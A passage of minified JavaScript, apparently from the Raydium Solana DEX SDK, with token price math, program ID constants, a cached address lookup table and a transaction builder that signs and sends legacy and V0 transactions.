        super(r, o),
          (this.baseToken = e),
          (this.quoteToken = n),
          (this.scalar = new _I(eS(e.decimals), eS(n.decimals)));
      }
      get raw() {
        return new _I(this.numerator, this.denominator);
      }
      get adjusted() {
        return super.mul(this.scalar);
      }
      invert() {
        return new JI({
          baseToken: this.quoteToken,
          quoteToken: this.baseToken,
          denominator: this.numerator,
          numerator: this.denominator,
        });
      }
      mul(t) {
        this.quoteToken !== t.baseToken &&
          ZI.logWithError("mul token not equals");
        let e = super.mul(t);
        return new JI({
          baseToken: this.baseToken,
          quoteToken: t.quoteToken,
          denominator: e.denominator,
          numerator: e.numerator,
        });
      }
      toSignificant(t = this.quoteToken.decimals, e, n) {
        return this.adjusted.toSignificant(t, e, n);
      }
      toFixed(t = this.quoteToken.decimals, e, n) {
        return this.adjusted.toFixed(t, e, n);
      }
    };
  function YI(t) {
    return "string" == typeof t
      ? MI(t)
      : Array.isArray(t)
      ? t.map((t) => YI(t))
      : (function (t) {
          return (
            "object" == typeof t &&
            null !== t &&
            ![GI, BI, Xi, _I, Zn, JI, XI].some(
              (e) => "object" == typeof e && t instanceof e
            )
          );
        })(t)
      ? Object.fromEntries(Object.entries(t).map(([t, e]) => [t, YI(e)]))
      : t;
  }
  var QI = new Zn(0),
    $I = new Zn(1);
  new Zn(2), new Zn(3), new Zn(5);
  var tS = new Zn(10);
  function eS(t) {
    return tS.pow(bI(t));
  }
  function nS(t, e) {
    let n = t.divmod(e);
    return n.mod.isZero()
      ? n.div
      : n.div.isNeg()
      ? n.div.isubn(1)
      : n.div.iaddn(1);
  }
  function rS(t, e, n) {
    return t.mul(e).add(n).sub(new Zn(1)).div(n);
  }
  function oS(t, e, n) {
    return t.mul(e).div(n);
  }
  function iS(t, e = 1, n = []) {
    let r = [...t];
    if (e <= 0) return n;
    for (; r.length; ) n.push(r.splice(0, e));
    return n;
  }
  new Zn(100), new Zn(1e3), new Zn(1e4);
  var sS,
    aS = class {
      constructor(t) {
        this._owner = t;
      }
      get publicKey() {
        return aS.isKeyPair(this._owner) ? this._owner.publicKey : this._owner;
      }
      get signer() {
        return aS.isKeyPair(this._owner) ? this._owner : void 0;
      }
      get isKeyPair() {
        return aS.isKeyPair(this._owner);
      }
      get isPublicKey() {
        return aS.isPublicKey(this._owner);
      }
      static isKeyPair(t) {
        return void 0 !== t.secretKey;
      }
      static isPublicKey(t) {
        return !aS.isKeyPair(t);
      }
    },
    uS =
      (((sS = uS || {})[(sS.V0 = 0)] = "V0"),
      (sS[(sS.LEGACY = 1)] = "LEGACY"),
      sS),
    cS = "CreateAccount",
    lS = "InitAccount",
    dS = "CreateATA",
    fS = "CloseAccount",
    hS = "TransferAmount",
    pS = "InitMarket",
    mS = "SetComputeUnitPrice",
    gS = "SetComputeUnitLimit",
    yS = "ClmmCreatePool",
    wS = "ClmmOpenPosition",
    bS = "ClmmIncreasePosition",
    vS = "ClmmDecreasePosition",
    AS = "ClmmClosePosition",
    kS = "ClmmSwapBaseIn",
    IS = "ClmmSwapBaseOut",
    SS = "ClmmInitReward",
    _S = "ClmmSetReward",
    TS = "ClmmCollectReward",
    CS = "ClmmLockPosition",
    BS = "ClmmHarvestLockPosition",
    ES = "AmmV4AddLiquidity",
    xS = "AmmV4RemoveLiquidity",
    PS = "AmmV4SwapBaseIn",
    RS = "AmmV4CreatePool",
    OS = "AmmV5AddLiquidity",
    MS = "AmmV5RemoveLiquidity",
    LS = "AmmV5SwapBaseIn",
    NS = "RouteSwap",
    DS = "FarmV3Deposit",
    US = "FarmV3Withdraw",
    qS = "FarmV3CreateLedger",
    WS = "FarmV4Withdraw",
    zS = "FarmV5Deposit",
    KS = "FarmV5Withdraw",
    FS = "FarmV6Deposit",
    jS = "FarmV6Withdraw",
    GS = "FarmV6Create",
    VS = "FarmV6Restart",
    HS = "FarmV6CreatorAddReward",
    XS = "FarmV6CreatorWithdraw",
    ZS = "CpmmCreatePool",
    JS = "CpmmAddLiquidity",
    YS = "CpmmWithdrawLiquidity",
    QS = "CpmmSwapBaseIn",
    $S = "CpmmSwapBaseOut",
    t_ = "CpmmLockLp",
    e_ = "CpmmCollectLockFee",
    n_ = "TransferTip",
    r_ = CA("Raydium_txUtil");
  function o_(t) {
    let e = [],
      n = [];
    return (
      t.microLamports &&
        (e.push(Yu.setComputeUnitPrice({ microLamports: t.microLamports })),
        n.push(mS)),
      t.units &&
        (e.push(Yu.setComputeUnitLimit({ units: t.units })), n.push(gS)),
      { instructions: e, instructionTypes: n }
    );
  }
  async function i_(t, e) {
    var n, r;
    let o = null != e ? e : "confirmed";
    return null ==
      (r = await (null == (n = t.getLatestBlockhash)
        ? void 0
        : n.call(t, { commitment: o })))
      ? void 0
      : r.blockhash;
  }
  async function s_(t, e) {
    return (
      t.getSignatureStatuses([e]),
      new Promise((n, r) => {
        let o = setTimeout(r, 6e4);
        t.onSignature(
          e,
          (t) => {
            if ((clearTimeout(o), !t.err)) return n(""), void 0;
            r(Object.assign(t.err, { txId: e }));
          },
          "confirmed"
        );
      })
    );
  }
  function a_(t, e) {
    t.length < 1 &&
      r_.logWithError(`no instructions provided: ${t.toString()}`),
      e.length < 1 && r_.logWithError(`no signers provided:, ${e.toString()}`);
    let n = new bs();
    (n.recentBlockhash = "11111111111111111111111111111111"),
      (n.feePayer = e[0]),
      n.add(...t);
    try {
      return (
        ct.from(n.serialize({ verifySignatures: !1 })).toString("base64")
          .length < 1644
      );
    } catch {
      return !1;
    }
  }
  function u_(t, e) {
    let [n, r] = Xi.findProgramAddressSync(t, e);
    return { publicKey: n, nonce: r };
  }
  function c_({ instructions: t, payer: e, signers: n }) {
    return a_(t, [e, ...n]);
  }
  function l_({
    instructions: t,
    payer: e,
    lookupTableAddressAccount: n,
    recentBlockhash: r = Hu.generate().publicKey.toString(),
  }) {
    let o = new vs({
      payerKey: e,
      recentBlockhash: r,
      instructions: t,
    }).compileToV0Message(Object.values(null != n ? n : {}));
    try {
      return ct.from(new As(o).serialize()).toString("base64").length < 1644;
    } catch {
      return !1;
    }
  }
  var d_ = (t) => {
    let e = t.serialize({ requireAllSignatures: !1, verifySignatures: !1 });
    t instanceof As &&
      (e = ((t) =>
        ct.isBuffer(t)
          ? t
          : t instanceof Uint8Array
          ? ct.from(t.buffer, t.byteOffset, t.byteLength)
          : ct.from(t))(e));
    try {
      return e instanceof ct
        ? e.toString("base64")
        : ct.from(e).toString("base64");
    } catch {
      return e.toString("base64");
    }
  };
  function f_(t) {
    let e = [];
    return (
      t.forEach((t) => {
        t instanceof bs &&
          (t.recentBlockhash || (t.recentBlockhash = _c.toBase58()),
          t.feePayer || (t.feePayer = Hu.generate().publicKey)),
          e.push(d_(t));
      }),
      void 0,
      e
    );
  }
  function h_(t, e, n) {
    return u_(
      [t.toBuffer(), (null != n ? n : _c).toBuffer(), e.toBuffer()],
      new Xi("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
    );
  }
  var p_ = new Xi("EhhTKczWMGQt46ynNeRX1WfeagwwJd7ufHvCDjRxjo5Q"),
    m_ = new Xi("CBuCnLe26faBpcBP2fktp4rp8abpcAnTWft6ZrP5Q4T"),
    g_ = new Xi("9KEPoZmtHUrBbhWN1v1KWLMkkvwY6WLtAVUCPRtRjP4z"),
    y_ = new Xi("FarmqiPv5eAj3j1GMdMCMUGXqPUvmquZtMy86QH6rzhG");
  new Xi("CLaimxFqjHzgTJtAGHU47NPhg6qrc5sCnpC4tBLyABQS");
  var w_ = new Xi("srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX"),
    b_ = new Xi("9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin"),
    v_ = new Xi("675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8");
  new Xi("5quBtoiQqxF9Jv6KYKctB59NT3gtJD2Y65kdnB1Uev3h");
  var A_ = new Xi("CDSr3ssLcRB6XYPJwAfFt18MZvEZp4LjHcvzBVZ45duo"),
    k_ = new Xi("CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK"),
    I_ = new Xi("LockrWmn6K5twhz3y9w1dQERbmgSaRkfnTeTKbpofwE"),
    S_ = new Xi("kN1kEznaF5Xbd8LYuqtEFcxzWSBk5Fv6ygX6SqEGJVy");
  new Xi("routeUGWgWzqBWFcrCfv8tritsqukccJPu3q5GPP3xS");
  var __ = new Xi("7YttLkHDoNj9wyDur5pM1ejNaAvT9X4eqaYcHQqtj2G5"),
    T_ = new Xi("6FJon3QE27qgPVggARueB22hLvoh22VzJpXv4rBEoSLF"),
    C_ = new Xi("CC12se5To1CdEuw7fDS27B7Geo5jJyL7t5UK2B44NgiH"),
    B_ = new Xi("9HzJyW1qZsEiSfMUf6L2jo3CcTKAyBmSyKdwQeYisHrC"),
    E_ = new Xi("DropEU8AvevN3UrXWXTMuz3rqnMczQVNjq3kcSdW2SQi"),
    x_ = new Xi("CPMMoo8L3F4NbTegBCKVNunggL7H1ZpdTHKxQB5qKP1C"),
    P_ = new Xi("GpMZbSM2GgvTKHJirzeGfMFoaZ8UR2X7F4v8vHTvxFbL");
  new Xi("DNXgeM9EiiaAbaWvwjHj9fQQLAX5ZsfHyvmYUNRAdNC8"),
    new Xi("CPMDWBwJDtYax9qW7AyRuVC19Cc4L4Vcy4n2BHAbHkCW"),
    new Xi("7rQ1QFNosMkUCuh7Z7fPbTHvh73b68sQYdirycEzJVuw"),
    new Xi("G11FKBRaAkHAKuLCgLM6K6NUc9rTjPAznRCjZifrTQe2");
  var R_ = new Xi("LockrWmn6K5twhz3y9w1dQERbmgSaRkfnTeTKbpofwE");
  new Xi("DLockwT7X7sxtLmGH9g5kmfcjaBtncdbUmi738m5bvQC");
  var O_ = new Xi("3f7GcQFG397GAaEnv51zR6tsTVihYRydnydDD1cXekxH");
  new Xi("7AFUeLVRjBfzqK3tTGw8hN48KLQWSk6DTE8xprWdPqix");
  var M_ = new Xi("LanMV9sAd7wArD4vJFi2qDdfnVhFxYSUg6eADduJ3uj");
  new Xi("WLHv2UAZm6z4KyaaELi5pjdbJh6RESMva1Rnn8pJVVh"),
    new Xi("LanD8FpTBBvzZFXjTxsAoipkFsxPUCDB4qAqKxYDiNP"),
    new Xi("HYNHiyKJ3gGVFvyxJAurK7qr7P2o5J9THmvCGMdULtpW");
  var L_ = {
    IDO_PROGRAM_ID_V1: T_,
    IDO_PROGRAM_ID_V2: C_,
    IDO_PROGRAM_ID_V3: B_,
    IDO_PROGRAM_ID_V4: E_,
  };
  ({
    SERUM_MARKET: Xi.default,
    OPENBOOK_MARKET: new Xi("EoTcMgcDRTJVZDMZWBoU6rhYHZfkNTVEAfz3uUJRcYGj"),
    UTIL1216: Xi.default,
    FarmV3: new Xi("85BFyr98MbCUU9MVTEgzx1nbhWACbJqLzho6zd6DZcWL"),
    FarmV5: new Xi("EcLzTrNg9V7qhcdyXDe2qjtPkiGzDM2UbdRaeaadU5r2"),
    FarmV6: new Xi("Farm2hJLcqPtPg8M4rR6DMrsRNc5TPm5Cs4bVQrMe2T7"),
    AmmV4: new Xi("HWy1jotHpo6UqeQxx49dpYYdQB8wj9Qk9MdxwjLvDHB8"),
    AmmStable: new Xi("DDg4VmQaJV9ogWce7LpcjBA9bv22wRp5uaTPa5pGjijF"),
    CLMM: new Xi("devi51mZmdwUJGU9hjN27vEz64Gps7uUefqxg27EAtH"),
    CLMM_LOCK_PROGRAM_ID: new Xi(
      "DLockwT7X7sxtLmGH9g5kmfcjaBtncdbUmi738m5bvQC"
    ),
    CLMM_LOCK_AUTH_ID: new Xi("8qmHNvu2Kr2C7U8mJL4Vz1vTDxMhVuXKREwU7TNoaVEo"),
    Router: new Xi("BVChZ3XFEwTMUk1o9i3HAf91H6mFxSwa5X2wFAWhYPhU"),
    FEE_DESTINATION_ID: new Xi("3XMrhbv989VxAMi3DErLV9eJht1pHppW5LbKxe9fkEFR"),
  });
  var N_ = 1e4;
  function D_(t, e, n, r) {
    if (void 0 === e) return { amount: t, fee: void 0, expirationTime: void 0 };
    let o = AA(vA({}, e), {
        olderTransferFee: {
          epoch: BigInt(e.olderTransferFee.epoch),
          maximumFee: BigInt(e.olderTransferFee.maximumFee),
          transferFeeBasisPoints: e.olderTransferFee.transferFeeBasisPoints,
        },
        newerTransferFee: {
          epoch: BigInt(e.newerTransferFee.epoch),
          maximumFee: BigInt(e.newerTransferFee.maximumFee),
          transferFeeBasisPoints: e.newerTransferFee.transferFeeBasisPoints,
        },
      }),
      i =
        n.epoch < o.newerTransferFee.epoch
          ? o.olderTransferFee
          : o.newerTransferFee,
      s = new Zn(i.maximumFee.toString()),
      a =
        n.epoch < o.newerTransferFee.epoch
          ? (400 *
              (Number(o.newerTransferFee.epoch) * n.slotsInEpoch -
                n.absoluteSlot)) /
            1e3
          : void 0;
    if (r) {
      if (i.transferFeeBasisPoints === N_) {
        let e = new Zn(i.maximumFee.toString());
        return { amount: t.add(e), fee: e, expirationTime: a };
      }
      {
        let e = q_(t.mul(new Zn(N_)), new Zn(N_ - i.transferFeeBasisPoints)),
          n = new Zn(i.maximumFee.toString()),
          r = e.sub(t).gt(n) ? t.add(n) : e,
          o = q_(r.mul(new Zn(i.transferFeeBasisPoints)), new Zn(N_));
        return { amount: r, fee: o.gt(s) ? s : o, expirationTime: a };
      }
    }
    {
      let e = q_(t.mul(new Zn(i.transferFeeBasisPoints)), new Zn(N_));
      return { amount: t, fee: e.gt(s) ? s : e, expirationTime: a };
    }
  }
  function U_(t, e) {
    return void 0 === t ? e : void 0 === e ? t : Math.min(t, e);
  }
  function q_(t, e) {
    let { div: n, mod: r } = t.divmod(e);
    return r.gt(new Zn(0)) ? n.add(new Zn(1)) : n;
  }
  function W_(t, e) {
    if (t.isZero()) return new Zn(0);
    let n = t.div(e);
    return n.isZero()
      ? new Zn(1)
      : t.mod(e).gt(new Zn(0))
      ? n.add(new Zn(1))
      : n;
  }
  async function z_({ connection: t, address: e }) {
    let n = await EA(
        t,
        [...new Set(e.map((t) => t.toString()))].map((t) => new Xi(t))
      ),
      r = {};
    for (let o = 0; o < e.length; o++) {
      let t = n[o],
        i = e[o];
      if (!t) continue;
      let s = new ta({ key: i, state: ta.deserialize(t.data) });
      (r[i.toString()] = s), (F_[i.toString()] = s);
    }
    return r;
  }
  var K_,
    F_ = {
      AcL1Vo8oy1ULiavEcjSUcwfBSForXMudcZvDZy5nzJkU: new ta({
        key: new Xi("AcL1Vo8oy1ULiavEcjSUcwfBSForXMudcZvDZy5nzJkU"),
        state: ta.deserialize(
          ct.from(
            "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",
            "base64"
          )
        ),
      }),
    },
    j_ = 2e3,
    G_ = class {
      constructor(t) {
        (this.instructions = []),
          (this.endInstructions = []),
          (this.lookupTableAddress = []),
          (this.signers = []),
          (this.instructionTypes = []),
          (this.endInstructionTypes = []),
          (this.connection = t.connection),
          (this.feePayer = t.feePayer),
          (this.signAllTransactions = t.signAllTransactions),
          (this.owner = t.owner),
          (this.cluster = t.cluster),
          (this.blockhashCommitment = t.blockhashCommitment),
          (this.loopMultiTxStatus = !!t.loopMultiTxStatus);
      }
      get AllTxData() {
        return {
          instructions: this.instructions,
          endInstructions: this.endInstructions,
          signers: this.signers,
          instructionTypes: this.instructionTypes,
          endInstructionTypes: this.endInstructionTypes,
          lookupTableAddress: this.lookupTableAddress,
        };
      }
      get allInstructions() {
        return [...this.instructions, ...this.endInstructions];
      }
      async getComputeBudgetConfig() {
        var t;
        let e = (
            await Jb.get(
              "https://solanacompass.com/api/fees?cacheFreshTime=300000"
            )
          ).data,
          { avg: n } = null != (t = null == e ? void 0 : e[15]) ? t : {};
        if (n)
          return {
            units: 6e5,
            microLamports: Math.min(Math.ceil((1e6 * n) / 6e5), 25e3),
          };
      }
      addCustomComputeBudget(t) {
        if (t) {
          let { instructions: e, instructionTypes: n } = o_(t);
          return (
            this.instructions.unshift(...e),
            this.instructionTypes.unshift(...n),
            !0
          );
        }
        return !1;
      }
      addTipInstruction(t) {
        var e;
        return (
          !!t &&
          (this.endInstructions.push(
            Fs.transfer({
              fromPubkey: null != (e = t.feePayer) ? e : this.feePayer,
              toPubkey: new Xi(t.address),
              lamports: BigInt(t.amount.toString()),
            })
          ),
          this.endInstructionTypes.push(n_),
          !0)
        );
      }
      async calComputeBudget({ config: t, defaultIns: e }) {
        try {
          let n = t || (await this.getComputeBudgetConfig());
          if (this.addCustomComputeBudget(n)) return;
          e && this.instructions.unshift(...e);
        } catch {
          e && this.instructions.unshift(...e);
        }
      }
      addInstruction({
        instructions: t = [],
        endInstructions: e = [],
        signers: n = [],
        instructionTypes: r = [],
        endInstructionTypes: o = [],
        lookupTableAddress: i = [],
      }) {
        return (
          this.instructions.push(...t),
          this.endInstructions.push(...e),
          this.signers.push(...n),
          this.instructionTypes.push(...r),
          this.endInstructionTypes.push(...o),
          this.lookupTableAddress.push(
            ...i.filter((t) => t !== Xi.default.toString())
          ),
          this
        );
      }
      async versionBuild({ txVersion: t, extInfo: e }) {
        return 0 === t ? await this.buildV0(vA({}, e || {})) : this.build(e);
      }
      build(t) {
        var e;
        let n = new bs();
        return (
          this.allInstructions.length && n.add(...this.allInstructions),
          (n.feePayer = this.feePayer),
          (null == (e = this.owner) ? void 0 : e.signer) &&
            !this.signers.some((t) =>
              t.publicKey.equals(this.owner.publicKey)
            ) &&
            this.signers.push(this.owner.signer),
          {
            builder: this,
            transaction: n,
            signers: this.signers,
            instructionTypes: [
              ...this.instructionTypes,
              ...this.endInstructionTypes,
            ],
            execute: async (t) => {
              var e;
              let {
                  recentBlockHash: r,
                  skipPreflight: o = !0,
                  sendAndConfirm: i,
                  notSendToRpc: s,
                } = t || {},
                a =
                  null != r
                    ? r
                    : await i_(this.connection, this.blockhashCommitment);
              if (
                ((n.recentBlockhash = a),
                this.signers.length && n.sign(...this.signers),
                f_([n]),
                null != (e = this.owner) && e.isKeyPair)
              )
                return {
                  txId: i
                    ? await Os(
                        this.connection,
                        n,
                        this.signers.find((t) =>
                          t.publicKey.equals(this.owner.publicKey)
                        )
                          ? this.signers
                          : [...this.signers, this.owner.signer],
                        { skipPreflight: o }
                      )
                    : await this.connection.sendRawTransaction(n.serialize(), {
                        skipPreflight: o,
                      }),
                  signedTx: n,
                };
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions([n]);
                if (this.signers.length)
                  for (let e of t)
                    try {
                      e.sign(...this.signers);
                    } catch {}
                return {
                  txId: s
                    ? ""
                    : await this.connection.sendRawTransaction(
                        t[0].serialize(),
                        { skipPreflight: o }
                      ),
                  signedTx: t[0],
                };
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: t || {},
          }
        );
      }
      buildMultiTx(t) {
        var e;
        let { extraPreBuildData: n = [], extInfo: r } = t,
          { transaction: o } = this.build(r),
          i = n.filter((t) => t.transaction.instructions.length > 0),
          s = [o, ...i.map((t) => t.transaction)],
          a = [this.signers, ...i.map((t) => t.signers)],
          u = [
            ...this.instructionTypes,
            ...i.map((t) => t.instructionTypes).flat(),
          ];
        return (
          null != (e = this.owner) &&
            e.signer &&
            a.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                this.signers.push(this.owner.signer);
            }),
          {
            builder: this,
            transactions: s,
            signers: a,
            instructionTypes: u,
            execute: async (t) => {
              var e;
              let {
                  sequentially: n,
                  onTxUpdate: r,
                  skipTxCount: o = 0,
                  recentBlockHash: i,
                  skipPreflight: u = !0,
                } = t || {},
                c =
                  null != i
                    ? i
                    : await i_(this.connection, this.blockhashCommitment);
              if (null != (e = this.owner) && e.isKeyPair) {
                if (n) {
                  let t = [],
                    e = 0;
                  for (let n of s) {
                    if ((++e, e <= o)) continue;
                    let r = await Os(
                      this.connection,
                      n,
                      this.signers.find((t) =>
                        t.publicKey.equals(this.owner.publicKey)
                      )
                        ? this.signers
                        : [...this.signers, this.owner.signer],
                      { skipPreflight: u }
                    );
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: s };
                }
                return {
                  txIds: await await Promise.all(
                    s.map(
                      async (t) => (
                        (t.recentBlockhash = c),
                        await this.connection.sendRawTransaction(
                          t.serialize(),
                          { skipPreflight: u }
                        )
                      )
                    )
                  ),
                  signedTxs: s,
                };
              }
              if (this.signAllTransactions) {
                let t = s.map(
                  (t, e) => (
                    (t.recentBlockhash = c), a[e].length && t.sign(...a[e]), t
                  )
                );
                f_(t);
                let e = await this.signAllTransactions(t);
                if (n) {
                  let t = 0,
                    n = [],
                    o = async () => {
                      if (!e[t]) return;
                      let i = await this.connection.sendRawTransaction(
                        e[t].serialize(),
                        { skipPreflight: u }
                      );
                      n.push({ txId: i, status: "sent", signedTx: e[t] }),
                        null == r || r([...n]),
                        t++;
                      let s = !1,
                        a = null,
                        c = null,
                        l = (t) => {
                          null !== a && clearInterval(a),
                            null !== c &&
                              this.connection.removeSignatureListener(c);
                          let e = n.findIndex((t) => t.txId === i);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || o();
                        };
                      this.loopMultiTxStatus &&
                        (a = setInterval(async () => {
                          var t;
                          if (s) return clearInterval(a), void 0;
                          try {
                            let e = await this.connection.getTransaction(i, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((s = !0),
                              clearInterval(a),
                              l({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (s = !0), clearInterval(a), void 0;
                          }
                        }, j_)),
                        (c = this.connection.onSignature(
                          i,
                          (t) => {
                            if (s)
                              return (
                                this.connection.removeSignatureListener(c),
                                void 0
                              );
                            (s = !0), l(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(i);
                    };
                  return (
                    await o(), { txIds: n.map((t) => t.txId), signedTxs: e }
                  );
                }
                {
                  let t = [];
                  for (let n = 0; n < e.length; n += 1) {
                    let r = await this.connection.sendRawTransaction(
                      e[n].serialize(),
                      { skipPreflight: u }
                    );
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: e };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: r || {},
          }
        );
      }
      async versionMultiBuild({
        extraPreBuildData: t,
        txVersion: e,
        extInfo: n,
      }) {
        return 0 === e
          ? await this.buildV0MultiTx({
              extraPreBuildData: t,
              buildProps: n || {},
            })
          : this.buildMultiTx({ extraPreBuildData: t, extInfo: n });
      }
      async buildV0(t) {
        var e;
        let n = t || {},
          {
            lookupTableCache: r = {},
            lookupTableAddress: o = [],
            forerunCreate: i,
            recentBlockhash: s,
          } = n,
          a = kA(n, [
            "lookupTableCache",
            "lookupTableAddress",
            "forerunCreate",
            "recentBlockhash",
          ]),
          u = vA(vA({}, "devnet" === this.cluster ? {} : F_), r),
          c = Array.from(new Set([...o, ...this.lookupTableAddress])),
          l = [];
        for (let m of c) void 0 === u[m] && l.push(new Xi(m));
        let d = await z_({ connection: this.connection, address: l });
        for (let [m, g] of Object.entries(d)) u[m] = g;
        let f = i
            ? Xi.default.toBase58()
            : null != s
            ? s
            : await i_(this.connection, this.blockhashCommitment),
          h = new vs({
            payerKey: this.feePayer,
            recentBlockhash: f,
            instructions: [...this.allInstructions],
          }).compileToV0Message(Object.values(u));
        (null == (e = this.owner) ? void 0 : e.signer) &&
          !this.signers.some((t) => t.publicKey.equals(this.owner.publicKey)) &&
          this.signers.push(this.owner.signer);
        let p = new As(h);
        return (
          p.sign(this.signers),
          {
            builder: this,
            transaction: p,
            signers: this.signers,
            instructionTypes: [
              ...this.instructionTypes,
              ...this.endInstructionTypes,
            ],
            execute: async (t) => {
              var e;
              let {
                skipPreflight: n = !0,
                sendAndConfirm: r,
                notSendToRpc: o,
              } = t || {};
              if ((f_([p]), null != (e = this.owner) && e.isKeyPair)) {
                let t = await this.connection.sendTransaction(p, {
                  skipPreflight: n,
                });
                return (
                  r && (await s_(this.connection, t)), { txId: t, signedTx: p }
                );
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions([p]);
                if (this.signers.length)
                  for (let e of t)
                    try {
                      e.sign(this.signers);
                    } catch {}
                return {
                  txId: o
                    ? ""
                    : await this.connection.sendTransaction(t[0], {
                        skipPreflight: n,
                      }),
                  signedTx: t[0],
                };
              }
              throw new Error(
